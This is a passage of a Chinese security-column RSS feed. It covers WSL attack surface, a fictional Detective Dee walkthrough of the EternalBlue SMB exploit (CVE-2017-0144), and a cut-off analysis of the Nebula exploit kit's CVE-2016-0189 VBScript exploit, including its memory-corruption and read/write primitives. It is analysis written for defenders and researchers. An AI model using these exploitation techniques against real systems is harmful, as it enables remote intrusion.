data-rawheight=&quot;318&quot;&gt;&lt;p&gt;WSL通过在Windows NT内核之上虚拟Linux内核接口，来执行未修改的Linux ELF64二进制程序。内核接口之一就是系统调用（syscall）。系统调用就是内核提供的服务，可从用户模式调用。Linux内核与Windows NT内核都向用户模式提供大量系统调用，但两者语义不同，且并不直接兼容。比如说，Linux内核包括如fork、open、kill之类，而Windows NT内核则相应的有NtCreatProcess、NtOpenFile、NtTerminateProcess。&lt;/p&gt;&lt;p&gt;WSL包含内核模式驱动（lxss.sys和lxcore.sys），这些驱动负责处理Linux系统请求调用与Windows NT内核协调。它们并不包含Linux内核的代码，而采用Linux兼容内核界面的clean room implementation。在原生Linux中，用户模式可执行程序进行系统调用时，是由Linux内核处理。而在WSL中，可执行程序进行系统调用，Windows NT内核要将请求转发给lxcore.sys。lxcore.sys将Linux系统调用解释为相应的Windows NT调用，后者再依次处理。在没有合理对应的情况下，Windows内核模式驱动需要直接服务于请求。&lt;/p&gt;&lt;p&gt;感兴趣的同学可以点击这里作更多了解：&lt;a href=&quot;https://blogs.msdn.microsoft.com/wsl/2016/04/22/windows-subsystem-for-linux-overview/&quot; data-editable=&quot;true&quot; data-title=&quot;Windows Subsystem for Linux Overview&quot;&gt;Windows Subsystem for Linux Overview&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;增加的攻击面&lt;/h2&gt;&lt;p&gt;去年的Black Hat USA大会之上，Crowdstrike首席架构师Alex Ionescu做了个议题分享，名字就叫“Windows 10中藏着的Linux内核”。eWEEK后来也对他单独做了采访，Ionescu因此分享了更多细节。&lt;/p&gt;&lt;p&gt;他说早在beta测试期间，他就将发现的安全问题反馈给了微软，某些漏洞已经修复。不过他强调说，现如今的Windows系统令企业组织有了更大的攻击面，这是企业组织需要去了解的。&lt;/p&gt;&lt;p&gt;Ionescu表示：“在某些情况下，Windows系统中的Linux环境，由于兼容性问题会更不安全。Windows应用有很多方法针对Windows系统中的Linux应用植入代码、篡改内存，形成新的威胁。”&lt;/p&gt;&lt;blockquote&gt;“这样一来，你就有了个双头猛兽，既能对Linux做些小动作，也能对Windows进行攻击。”&lt;/blockquote&gt;&lt;p&gt;前面已经提到，Windows系统中的这个Linux并不是运行在Hyper-V虚拟机里面的，而是运行在原生硬件之上——Ionescu的用词说可以获得所有的性能和系统访问，因此扩大攻击面是必然的。而且Windows系统文件也对应到Linux系统，Linux访问相同的文件和路径。&lt;/p&gt;&lt;p&gt;另外WSL的更新机制也是Ionescu比较关注的——Windows系统中可设定计划任务，运行Apt-Get Linux命令，针对用户态作包升级。实际上，微软并没有真的用Ubuntu Linux内核，只是用户空间工具和应用。&lt;/p&gt;&lt;blockquote&gt;“内核是微软自家的实施方案，通过常规的Windows Update更新机制来更新。”&lt;/blockquote&gt;&lt;p&gt;除此之外，Ionescu提到的问题还包括微软针对Windows应用的白名单服务AppLocker，对Linux应用而言是没用的。也就是说，如果某家企业在系统中采用Linux，那么Linux应用的运行是不会经过AppLocker检查的。&lt;/p&gt;&lt;p&gt;这里我也没有掌握更多的资料可供具体分享（毕竟我向来都是个只在意理论，而对实操毫无兴趣的人，具体请看我的另一个专栏：周三特别行动小组）。在攻击面增加之外，防范方法当然还是要提一下——网络防火墙设备检查流量还是有效的；另外虽然用户的传统反病毒产品可能面对此类问题时不会有什么效果，但基于行为的安全软件还是能够发现IoC。&lt;/p&gt;&lt;p&gt;不过Ionescu认为，这方面的威胁应该短期内不会太严重，毕竟当前WSL还很新，也并没有广泛部署。“攻击者一般不会在意最新的事物，毕竟其对市场影响力有限。不过随着功能采用率的增加，还是可能会成为更具吸引力的攻击向量。”（最后容我吐槽下，不知道究竟是谁把attack vector最先翻译成了攻击向量，小学语文真的是…好了不说了…）&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-408a0615221a97d4a78f4ff162ce26b0_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;457&quot;&gt;&lt;p&gt;最后的最后，其实我一直很想吐槽微软近两年出现的各种短命且奇葩项目，比如说Project Astoria——在Windows 10 Mobile中塞个Android——其实Insider计划一度是出现过塞进Android的编译版本的（像追逐iOS的Project Islandwood计划则更昙花一现了）。是不是感觉跟Win10塞Linux也没差？这是其它话题了，而微软的脑回路近两年在纳德拉的影响下已经越来越曲折，就好像Windows on ARM一样（高通在Computex大会上已宣布支持完整版Windows）…这节奏是包罗万象的意思吗？攻击面？？？What…&lt;/p&gt;&lt;p&gt;* 参考来源：&lt;a href=&quot;https://blogs.msdn.microsoft.com/wsl/2016/04/22/windows-subsystem-for-linux-overview/&quot;&gt;微软&lt;/a&gt;，&lt;a href=&quot;http://www.eweek.com/security/risk-from-linux-kernel-hidden-in-windows-10-exposed-at-black-hat&quot;&gt;eWEEK&lt;/a&gt;, 转载请注明作者&lt;b&gt;欧阳洋葱&lt;/b&gt;，与出处&lt;b&gt;FreeBuf专栏&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2017-06-21-27497774</guid>
<pubDate>Wed, 21 Jun 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>狄仁杰探案之“永恒之蓝”</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-06-08-27307254.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27307254&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;b&gt;* 本文作者：兰云科技银河实验室，本文属FreeBuf原创奖励计划，未经许可禁止转载&lt;/b&gt;&lt;br&gt;&lt;p&gt;&lt;i&gt;&lt;b&gt;本故事纯属虚构，如有雷同，实属巧合。&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;唐武周年间，利用了永恒之蓝漏洞(CVE-2017-0144)的WannaCry 蠕虫爆发。朝野之间，电脑屏幕尽呈一片血色，刚刚宁定不久的武周天下，又面临一场浩劫。狄仁杰，元芳，狄春三人奉旨研究此漏洞，寻求破解之计。&lt;/p&gt;&lt;p&gt;深夜，狄公交给管家狄春一手稿，命其按此准备。但见手稿上写道&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;1） 靶机Win 7 SP1x86 虚拟机一台,无补&lt;/p&gt;&lt;p&gt;2） 攻击机器一台，虚拟机上安装NSA的EternalBlue 复现工具，详参&lt;a href=&quot;http://www.freebuf.com/sectool/132076.html&quot; data-title=&quot;ShadowBroker释放的NSA工具部分（windows）fb.py复现和中招检查方法 - FreeBuf.COM | 关注黑客与极客&quot; class=&quot;&quot;&gt;ShadowBroker释放的NSA工具部分（windows）fb.py复现和中招检查方法 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;/p&gt;&lt;p&gt;3） Windbg 远程调试环境,&lt;/p&gt;&lt;p&gt;4） IDA&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;不出半个时辰，管家狄春已准备妥当。狄公唤上元芳一同开始查看。&lt;/p&gt;&lt;p&gt;狄公一如既往问道，“元芳，你怎么看。”&lt;/p&gt;&lt;p&gt;“大人，卑职查看发现，所有感染的电脑 srv!SrvTransaction2DispatchTable的0x0e项均被替换。我们只需顺着这个线索往回顺藤摸瓜，定能找到真相。” 元芳答道。&lt;/p&gt;&lt;p&gt;狄公赞许的点了点头，“不错，一般来说，漏洞分析，第一步我们只需找到控制是如何转移的。第二步，便是往回顺藤摸瓜，看数据是如何被损坏，而导致控制转移的。”狄公随即在windbg中敲下了如下命令。&lt;img src=&quot;https://pic1.zhimg.com/v2-9b814183c33506cb4cc08605ab4fcae7_r.jpg&quot;&gt;运行fb.py，很快便见windbg断下在如下地址&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-10ec80a5ab088aed2e824c7ad64b56ac_r.jpg&quot;&gt;狄公似乎想到了什么，紧接着&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c226adcb6e74b7e68036fd61d6790228_r.jpg&quot;&gt;元芳道, “果然是这里”，将SrvTransaction2DispatchTable+ 0×38 ，也便是0xe(0xe *4 = 0×38) 项，进行了替换。&lt;/p&gt;&lt;p&gt;狄仁杰道，“然而这里并非凶案第一现场，这段代码应该是shellcode，我们尚需弄清控制是如何转移到这shellcode的。”&lt;/p&gt;&lt;p&gt;元芳用.writemem命令将这段shellcode dump 了出来，仔细查看。“shellcode入口应该便是这里。” 元芳指着这段代码道。&lt;img src=&quot;https://pic1.zhimg.com/v2-1361d263006fbb45bf31e0b10caf5505_r.jpg&quot;&gt;狄仁杰不仅不慢重新启动调试，敲下如下命令。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5ce4eb3ef429ab55cf990840645a2043_r.jpg&quot;&gt;“可是大人，这地址 –每次调试，不会变化吗?” 元芳有些疑惑道。&lt;/p&gt;&lt;p&gt;狄公笑笑，“那就让我们来试试运气吧… …”&lt;/p&gt;&lt;p&gt;“大人你看，真的断下来了。” 元芳看见断点真的命中了。&lt;/p&gt;&lt;p&gt;狄公捋了下胡子，微微一笑，“看来我们的运气不错啊”，他凝视了一下屏幕，继续敲下&lt;img src=&quot;https://pic1.zhimg.com/v2-f0318426309808fa00f50983f763cd89_r.jpg&quot;&gt;狄公道，“栈顶的91a18290 很可能就是转移到shellcode的call指令的返回地址。”&lt;/p&gt;&lt;p&gt;狄公随即打开Disassembly窗口&lt;img src=&quot;https://pic1.zhimg.com/v2-04a68f3c7b6e2e43fe83a2440d613f9e_r.jpg&quot;&gt;狄公道，“应该就是这条call dword ptr [eax+4] 指令，将控制转移到了shellcode,元芳你看”&lt;img src=&quot;https://pic1.zhimg.com/v2-e909ad673088597ed74dac08a09f64ea_r.jpg&quot;&gt;元芳道，“大人，这第一步我们算是完成了，我们找到了控制是如何转移的。如果卑职没有猜错的话，ffdff190开始的数据，除了ffdff194，其余的地址都为0，像是伪造出来的。”&lt;/p&gt;&lt;p&gt;狄公点点头，“我们现在需要做的就是，看看数据是从哪里来的，以及是如何被损坏的。”&lt;/p&gt;&lt;p&gt;狄公查看了调用堆栈&lt;img src=&quot;https://pic1.zhimg.com/v2-c2849c2ce23892f8203b4afd0b0562f3_r.jpg&quot;&gt;“是用IDA 分析代码的时候了。”狄公用 IDA 加载了 srvnet.sys文件，开始静态分析。&lt;/p&gt;&lt;p&gt;约莫一柱香的功夫，狄公缓缓说道，“元芳啊，你看，数据可以追溯回到SrvNetWskReceiveComplete 这个函数。这个函数是个IRP的完成例程。这个函数的第三个参数Context是IRP的Context。而Context 偏移0×24 处，存放了一个指针，里面存放了连接信息，我们姑且称其为Connection吧。这个Connection 会被作为第一个参数，传入SrvNetIndicateData()，而紧接着又会被作为第一个参数传入到 SrvNetCommonReceiveHandler。也就是说，Contex 由SrvnetAllocateBuffer分配，类型为SRVNET_BUFFFER 定义见下图&lt;img src=&quot;https://pic1.zhimg.com/v2-5ceda8d726cd41f4566059ee8267a62d_r.jpg&quot;&gt;该结构的0×24处的Connection被损坏了，于是便有了我们看到的一幕。你看，在调用SrvNetIndicateData()时，代码如下&lt;img src=&quot;https://pic1.zhimg.com/v2-0b6c32c0a2aead00ba2c4288858aab4c_r.jpg&quot;&gt;而我在查看堆栈发现了&lt;img src=&quot;https://pic1.zhimg.com/v2-fade3c0368aa1dd25b22b22c33c9f3a4_r.jpg&quot;&gt;于是我可以断定，&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6c35e6cba255a6db1adde9fd34a16356_r.jpg&quot;&gt;时，edi的值为ffdff020 压入了栈中。 于是我利用如下断点，重新调试一下&lt;img src=&quot;https://pic1.zhimg.com/v2-c82eb417f86747f1593f2aa83ae6fdde_r.jpg&quot;&gt;SrvNetWskReceiveComplete+0×14&lt;/p&gt;&lt;p&gt;我发现esi，也就是CONTEXT 的地址为0x86acd010, 而其偏移0×24, 也就是地址0x86acd034的地方，被损坏，变成了0x ffdff020。我们不妨再来试试手气，说不定，这个0x86acd034地址每次也不变呢。”&lt;/p&gt;&lt;p&gt;狄公又重启了调试，设置如下断点&lt;img src=&quot;https://pic1.zhimg.com/v2-f36600cc683d335fe178e4d00ee74efe_r.jpg&quot;&gt;断点再次命中。狄公再次查看堆栈&lt;img src=&quot;https://pic1.zhimg.com/v2-440ec64e8beb7f818725fa2cc1db04eb_r.jpg&quot;&gt;狄公邹了下眉头，多年的办案经验，让他想到了问题似乎出在了srv.sys！SrvOs2FeaToNt 函数的memmove上&lt;img src=&quot;https://pic1.zhimg.com/v2-87c2d03f37adbcf9d07f1fc81bcc3ab6_r.jpg&quot;&gt;如果往常一样，他在这个函数上设置了如下断点，打印出每次调用的参数&lt;img src=&quot;https://pic1.zhimg.com/v2-f80972377ec6a0f75e714fd979835726_r.jpg&quot;&gt;打印出信息如下两条引起了狄公的注意&lt;img src=&quot;https://pic1.zhimg.com/v2-0c1e44cd6a021350a5a930c53ae87907_r.jpg&quot;&gt;利用!pool命令验算是否越界，第一条，并没有问题。而第二条&lt;img src=&quot;https://pic1.zhimg.com/v2-64b9600d5df283f5a6beb899143890f1_r.jpg&quot;&gt;这个memmove调用将向86accff9 开始的0xa8 个字节里拷贝，即结束地址为86acd0a1。这已经越过了分配的地址 86acd000。&lt;/p&gt;&lt;p&gt;元芳见此，立刻说道，“大人我明白了，原来是memmove拷贝越界了导致内存损坏。”&lt;/p&gt;&lt;p&gt;狄公却摆手示意：“不，目前我们还不能解释为什么拷贝会越界。元芳，这个看来就交给你了”。&lt;/p&gt;&lt;p&gt;元芳会意，即刻开始分析并调试SrvOs2FeaToNt 和调用函数SrvOs2FeaListToNt 的代码。一个多时辰后，元芳突然兴奋的说道：“大人，我找道了。”&lt;/p&gt;&lt;p&gt;狄公微微一笑，“不妨说来听听。”&lt;/p&gt;&lt;p&gt;元芳道，“是，大人。卑职看来，这段代码其实是用来将OS/2 的FEA转化成NT的扩展属性EA。而问题就出现在SrvOs2FeaListToNt这厮身上，这厮会修改FEALIST的大小。而问题恰恰出现在了这里。&lt;img src=&quot;https://pic1.zhimg.com/v2-2e460ecb4003467863b3e599e794c683_r.jpg&quot;&gt;这里 v1 存放的是FEALIST 的大小，是个DWORD，本意是根据v3和v1的差值缩小FEALIST的大小。可是这里却用了WORD来计算。&lt;/p&gt;&lt;p&gt;我调试时发现，&lt;img src=&quot;https://pic1.zhimg.com/v2-fba27ce444ea3f64dee5607402c044e9_r.jpg&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-18ca8ad505211c8dc6e4f08de8a5ce43_r.jpg&quot;&gt;这里，本来试图把FEALIST的大小从00010000 缩小到0000ff5d。&lt;/p&gt;&lt;p&gt;然而，用了WORD来计算，&lt;/p&gt;&lt;p&gt;结果反倒变成了 0x1ff5d，一下变大了。&lt;img src=&quot;https://pic1.zhimg.com/v2-a6105c853edd23533ea03979d56a6703_r.jpg&quot;&gt;如此一来，下面也都错了。其实破解之策异常简单，仅需改成&lt;img src=&quot;https://pic1.zhimg.com/v2-03c3d585de60f3cf10060ee1b283b578_r.jpg&quot;&gt;即可。”&lt;/p&gt;&lt;p&gt;狄公点点头，“不错，元芳，一语中的啊。”&lt;/p&gt;&lt;p&gt;元芳道,“可是卑职尚有一事不明&lt;img src=&quot;https://pic1.zhimg.com/v2-d1774d3ea31acb683fa56142459d095c_r.jpg&quot;&gt;v1 如果是WORD指针，还尚可理解。 可v1这里是DWORD指针，这行代码，转化成WORD再计算，甚是怪异，莫非作者喝醉了不成?”&lt;/p&gt;&lt;p&gt;狄公微微一笑，“问得好啊，我其实也曾有过如此疑问。细细想来，如果作者没有喝醉，那还有一种可能… …”&lt;/p&gt;&lt;p&gt;“哦，还望大人明示。“ 元芳有些不解。&lt;/p&gt;&lt;p&gt;狄公说道，“还有一种可能，便是代码中可能使用了StoreUnsignedShort 这样的宏来赋值，这样一来，错误便更加隐蔽而不易被人察觉。”&lt;/p&gt;&lt;p&gt;“原来是这样！”元芳道，“这下卑职彻底明白了。”&lt;/p&gt;&lt;p&gt;狄公道：“元芳啊，分析漏洞不应放过每个细节。我且问你，“你有没有想过 0xffdff1f1地址中存放的shellcode是如何拷贝进去的啊？”&lt;/p&gt;&lt;p&gt;“这个。。。”元芳竟然一时语塞，“待卑职调试一下。”&lt;img src=&quot;https://pic1.zhimg.com/v2-054a4e3356cc05775830d2fc3ca75ef2_r.jpg&quot;&gt;元芳不由大吃一惊，“大人，怎么会这样，好象—竟是TCP/IP协议栈拷贝进去的。”&lt;/p&gt;&lt;p&gt;狄公微微一笑道：“你恰恰忽略了一点,在memmove拷贝的时候，覆盖掉的不仅仅是Context-&amp;gt;Connection。他同时也覆盖了相邻SRVNET_BUFFER.MDL的内容(偏移0x2c起)，从而使得TCP/IP协议栈拷贝到了ffdff1f1内存中。在x86上，ffdf1000开始到ffffffff地址，都是保留给HAL用的。你看下下面这张图便明白了。”&lt;img src=&quot;https://pic1.zhimg.com/v2-df9393322cd653f7ac6aae9b5f302423_r.jpg&quot;&gt;狄公道，“我们可以复命了。”&lt;/p&gt;&lt;p&gt;朝堂之上，狄公娓娓道来，整个攻击攻错大致是这样的。首先，歹人发送SMB 的 Session Setup AndX (0×73) 命令，跟据其响应中的 Native OS 获取目标操作系统的版本信息。有图为证&lt;img src=&quot;https://pic1.zhimg.com/v2-d5ac8da10714dc5ca68b715c81e73001_r.jpg&quot;&gt;紧接着，歹人的计划紧锣密鼓的展开。他利用了SMB.SMB_COM_NT_TRANSACT SMB_COM_TRANSACTION2_SECONDARY 在内存中精心布局，形成了一些连续的SRVNET_BUFFER内存区域。然后他关闭了一个链接，从而释放掉一个SRVNET_BUFFER，而这个释放掉的SRVNET_BUFFER空洞恰恰又会被FeaList 分配内存时重用(有图为证)。而SrvOs2FeaListToNt 中的Bug又导致了拷贝时越界，直接覆盖掉了其后的SRVNET_BUFFER，修改了MDL。于是后面的发送的数据就被错误的拷贝到了MDL 指定的内存中，也就是HAL保留的内存。而这时，歹人开始了致命的以一击，发送最后一个SMB_COM_TRANSACTION2_SECONDARY 分片，从而触发了控制转移。&lt;img src=&quot;https://pic1.zhimg.com/v2-66794c3f613e41948f2a96afc3f53b07_r.jpg&quot;&gt;奏毕，满朝皆惊。曾泰赞曰，“大人真乃神人也！”&lt;/p&gt;&lt;p&gt;退朝后，狄公却仍是心事重重，元芳便上前问道，“大人似乎还有心事？”&lt;/p&gt;&lt;p&gt;狄公叹道:“这永恒之蓝，犹如浩瀚的大海，深藏着诡谲与恐惧，吞噬着无辜和善良。虽然此案已结，可我始终却还有种不祥的预感，歹人不会就此罢休，总觉得似乎还有事情发生”。&lt;/p&gt;&lt;p&gt;不出所料，数日后，殿上急召狄仁杰觐见。 狄公缓缓叹道，“该来的总会来的，不会是Samba服务真的也出问题了吧。”但见一个微胖的身影在暮色中匆匆向大殿走去… …&lt;br&gt;&lt;br&gt;参考文献：&lt;/p&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/142548/MS17-010-EternalBlue-SMB-Remote-Windows-Kernel-Pool-Corruption.html&quot; data-title=&quot;MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption&quot; class=&quot;&quot;&gt;MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/&quot; data-title=&quot;NSA Eternalblue SMB 漏洞分析&quot; class=&quot;&quot;&gt;NSA Eternalblue SMB 漏洞分析&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/42031/&quot; data-title=&quot;Microsoft Windows Windows 7/2008 R2 (x64) - &#39;EternalBlue&#39; SMB Remote Code Execution (MS17-010)&quot; class=&quot;&quot;&gt;Microsoft Windows Windows 7/2008 R2 (x64) - &#39;EternalBlue&#39; SMB Remote Code Execution (MS17-010)&lt;/a&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2017-06-08-27307254</guid>
<pubDate>Thu, 08 Jun 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Nebula漏洞利用包CVE-2016-0189漏洞利用分析</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-04-18-26427502.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/26427502&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;*原创作者：兰云科技银河实验室，本文属FreeBuf原创奖励计划，未经许可禁止转载&lt;/b&gt;&lt;/p&gt;
&lt;h2&gt;1.	引言&lt;br&gt;&lt;/h2&gt;
&lt;p&gt;&lt;b&gt;在最近的一年里， 漏洞利用工具包(EK/Exploit Kit)市场风云变幻。2016年六月初，曾经极为猖獗的Angler EK 销声匿迹，Neutrino EK 迅速填补了空白。随后短短不到3个月时间，Neutrino EK 又转为地下，RIG EK继而成为最流行的漏洞利用工具包。今年3月初，RIG又淡出视线，而迎来了新的Nebula EK。&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Nebula EK包中对CVE-2016-0189的漏洞利用，比其它漏洞利用包的漏洞利用方有了一定改进，这里进行一下深入分析。&lt;/p&gt;
&lt;p&gt;所用工具:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;•	IE11(调试Javascript)&lt;/p&gt;
&lt;p&gt;•	windbg&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Nebula EK 的首页，如下图所示。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-50652028e33465ead584c1dab6bc953f_r.png&quot; data-rawwidth=&quot;597&quot; data-rawheight=&quot;352&quot;&gt;&lt;p&gt;不难看出，页面里包含了混淆过的Javascript代码。进一步分析，这些代码是否有种似曾相识的感觉?对了，代码的混淆方法跟落日漏洞利用工具包(Sundown EK)极为相似。&lt;/p&gt;
&lt;p&gt;页面中共有2段Javascript代码， 混淆方法相同。第一段Javascript代码，去掉混淆后，代码如下, 不难看出，这段代码就是CVE-2016-0189的漏洞利用。&lt;/p&gt;


&lt;p&gt;关于CVE-2016-0189，网上已有一些分析报告，比如Theori的分析[1]。 然而这些分析报告，并未提供在内存层面的技术细节，使得读者总有种知其然，不知其所以然的感觉。本文试图利用windbg来分析漏洞利用时的内存布局，使得读者对该漏洞利用有更深刻的理解。&lt;/p&gt;
&lt;h2&gt;2.	CVE-2016-0189的关键知识点&lt;/h2&gt;
&lt;p&gt;CVE-2016-0189是个关于VBScript的漏洞。VBScript 脚本引擎代码在vbscript.dll 中。&lt;/p&gt;
&lt;h3&gt;2.1.	VBScript的变量&lt;/h3&gt;
&lt;p&gt;VBScript 的内存变量占用0×10个字节， 前两个字节定了变量类型VARTYPE。常见类型定义如下表所示[2]。&lt;/p&gt;


&lt;p&gt;我们可以在VBScript代码中插入IsEmpty()函数，然后在windbg的vbscript!IsEmpty() 函数上设置断点来观察内存[3]。&lt;/p&gt;


&lt;p&gt;图1  调试用VBScript代码&lt;/p&gt;


&lt;p&gt;这里，0a560198就是str对象，这里 0008两个字节表示的是VARTYPE，根据表可知，值恰好为vbString(VT_BSTR = 8) 而偏移0×8处存放的就是字符串地址，&lt;/p&gt;


&lt;p&gt;这里还可以看出，字符串是Unicode存放的。&lt;/p&gt;
&lt;h3&gt;2.2.	VBScript的数组&lt;/h3&gt;
&lt;p&gt;VBScript 的数组的定义如下&lt;/p&gt;


&lt;p&gt;当访问数组元素时，VBScript引擎会调用 AccessArray 函数来计算元素的存放地址。&lt;/p&gt;
&lt;p&gt;试着用windbg 调试如下代码, 在vbscript!AccessArray处下断点:&lt;/p&gt;




&lt;p&gt;堆栈中0ab04380即为数组A地址&lt;/p&gt;


&lt;p&gt;数组元素存放在 pvData (0x7dfd130) 起始的地方&lt;/p&gt;
&lt;p&gt;在 vbscript!AccessArray+0x9d: 指令处停下   (不同版本这个偏移值可能会有出入)&lt;/p&gt;


&lt;p&gt;这条指令非常关键，它计算元素A(1,2) 的地址。 这里esi 就是SAFEARRAY的地址，而esi+0c是pvData的地址。eax值就是元素相对于pvData的偏移。查看eax值&lt;/p&gt;


&lt;p&gt;为什么A(1,2)的偏移会是0×50呢。 VBScript的数组内存布局和C语言有些不太一样。A数组的内存布局为 A(0,0) A(1,0) A(0, 1), A(1,1), A(0, 2), A(1,2),  而每个元素大小为0×10字节(cbElements)。因此 A(1,2) 的偏移为0×50。&lt;/p&gt;
&lt;h3&gt;2.3.	CVE-2016-0189 漏洞原理初探&lt;/h3&gt;
&lt;p&gt;CVE-2016-0189 的漏洞在AccessArray 函数代码中。我们看一下这个函数的逻辑：&lt;/p&gt;


&lt;p&gt;这个函数在根据索引计算偏移时，如果索引是VT_I2 或者VT_I4时，直接使用它的值。而如果是其它类型时候，将会调用rtVariantChangeTypeEx 函数来计算索引值。如果索引是JavaScript对象的话，将会调用索引对象的valueOf函数来获取索引的值。&lt;/p&gt;
&lt;p&gt;这似乎并没有太大问题，然而我们看一下漏洞利用脚本的valueOf函数&lt;/p&gt;


&lt;p&gt;除了返回值”1”因为， 它调用了SumggleFag函数&lt;/p&gt;
&lt;p&gt;查看该函数的代码可以发现：它调用了ZeroineL函数，而该函数将数组重新定义成了Cod(1,1)  （k1=1）&lt;/p&gt;



&lt;p&gt;到这里,我们明白了该漏洞的原理了，在AccessArray中计算索引值的时候，索引如果是个JavaScript对象，可以通过函数valueof来重新修改该数组的大小!  当数组的大小变小时，将会导致访问越界。&lt;/p&gt;
&lt;h2&gt;3.	CVE-2016-0189 漏洞利用深入分析&lt;/h2&gt;
&lt;p&gt;Nebula EK的漏洞利用在越界访问的基础上实现了：&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;1.	泄漏VBScript对象的地址&lt;/p&gt;
&lt;p&gt;2.	读取任意地址&lt;/p&gt;
&lt;p&gt;3.	写入任意地址（受限）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这3种手段在实现原理上都是类似的。通过将数组定义 Cod从(1,2000), 缩小到(1,1)，从而在AccessArray 函数中实现了越界访问。同时，立即使用大量y(i)  对释放掉的内存重新进行占位。由于y(i)是可控的，如果越界访问到y(i)的内存区，即可控制对内存的访问。&lt;/p&gt;
&lt;p&gt;下面我们利用windbg对内存进行观察，分析1.泄露VBScript对象地址的情形。&lt;/p&gt;
&lt;p&gt;需要注意的是，由于脚本中有大量数组操作，如果我们在AccessArray函数上下断点，可能会断下很多次。这里介绍一个小技巧:先将断点用bd命令禁掉，在想断下的VBScript 脚本前加入MsgBox函数，当MsgBox弹出后，我们再把断点用be命令恢复。这样就可以确保断在我们想断的地方。&lt;/p&gt;
&lt;p&gt;为清晰起见，我们将在脚本中将aw.Cod(0,0)设成0×11223344。&lt;/p&gt;
&lt;p&gt;利用该技巧，我们在vbscript!AccessArray+0x9d断在&lt;/p&gt;
&lt;p&gt; aw.Cod(arg1, 2) = s	// arg1.valueOf() == 1 , s 是我们试图泄露的对象地址&lt;/p&gt;
&lt;p&gt;这行越界访问（写入）处。&lt;/p&gt;
&lt;p&gt;断下时，&lt;/p&gt;


&lt;p&gt;0x2a659d0 就是 aw.Cod数组的pvData 地址，03 00 两个字节是vbLong (VT_I4), 而 44 33 22 11恰好为我们赋的值。 &lt;/p&gt;
&lt;p&gt;前面已经分析过aw.Cod(arg1,2), 即 aw.Cod(1,2), 该元素相对pvData的偏移就是0×50, 由于aw.Cod现在被重新设定为(1,1)，所以 大小为2*2*0×10=0×40, 也就是说 awCod(arg1,2) 越界了0×10个字节。&lt;/p&gt;
&lt;p&gt;aw.Cod(1,2) 的地址为 2a659d0 + 0×50 = 0x2a65a20。而从地址0x2a65a1c起（标为绿色的部分）是某个成功占位y(i) 的值。内存布局如下图所示:&lt;/p&gt;


&lt;p&gt;由上图可知，Aw.cod(1,2) 正好与y(i)的第四个字节开始的部分重叠。&lt;/p&gt;


&lt;p&gt;了解了这点。上面这段代码就不难理解了–遍历 y的所有元素，找到与Aw.cod(1,2) 重叠的那个y(i).  由于s 被写入了Aw.cod(1,2)， 即 yi(i) 的第四个字节开始的部分。那么Mid(y(i), 3, 1)&lt;/p&gt;
&lt;p&gt;正好是第四个字节开始的2个字节(注意Mid函数下表是从 1 开始的)，它存放的是对象的类型的值。 4个字节之后，则是对象的地址。这样，只须读取y(i)的内容，就可以获取对象的地址了。&lt;/p&gt;
&lt;p&gt;概括起来，Aw.cod 和 某个y(i)  重叠，我们可以通过Aw.cod的越界操作来将数据写入可控的y(i)里。&lt;/p&gt;
&lt;p&gt;下面讨论情形2 读取任意地址&lt;/p&gt;


&lt;p&gt;这次我们在占位的内存中，成功构造如下数据：&lt;/p&gt;


&lt;p&gt;Aw.cod(1,2) 将越界访问到 我们构造的占位内存 地址0x2f72878。&lt;/p&gt;
&lt;p&gt;08 00 为vbString类型VT_BSTR， 而48 c2 1b 01   四个字节则为试图读取的地址。&lt;/p&gt;
&lt;p&gt;当执行 o = aw.Cod(arg1,2)时， VBScript引擎将会把地址0x2f72878作为一个vbString对象来处理。而48 c2 1b 01   四个字节则作为字符串内容的地址来处理。&lt;/p&gt;
&lt;p&gt;读取该字符串的内容则获取了 48 c2 1b 01    地址里存放的内容。&lt;/p&gt;
&lt;p&gt;最后我们看一下写入任意地址（受限）的情形。&lt;/p&gt;


&lt;p&gt;写入与读取原理大致一样。这里只是将CSng(0) 赋值给了 aw.Cod(1,2)，从而导致 CSng 的类型值 4(VT_R4) 被写入了指定地址。这里脚本并未实现任意值的写入，然而并不影响漏洞的利用。&lt;/p&gt;
&lt;p&gt;最后我们看一下，整个漏洞利用是如何工作的:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;1）	首先，创建一个 对象，通过上述的方法(1) 泄露该对象的地址;&lt;/p&gt;
&lt;p&gt;2）	 在该对象偏移为8的地方，利用方法(2)读取内存获取CSession对象指针;&lt;/p&gt;
